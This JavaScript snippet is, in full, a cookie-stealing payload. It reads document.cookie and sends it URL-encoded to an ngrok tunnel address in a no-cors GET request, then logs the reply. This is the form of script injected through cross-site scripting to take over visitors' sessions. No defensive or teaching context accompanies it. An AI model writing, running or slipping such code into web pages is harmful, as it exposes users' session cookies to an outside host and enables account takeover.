const API_URL = 'https://b8bf34f0a1d0.ngrok-free.app';
const cookie = document.cookie;

const urlWithParams = `${API_URL}?cookie=${encodeURIComponent(cookie)}`;

fetch(urlWithParams, {
  method: 'GET',
  mode:'no-cors'
})
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.text(); 
  })
  .then(data => {
    console.log('Server response:', data);
  })
  .catch(error => {
    console.error('Request failed:', error);
  });
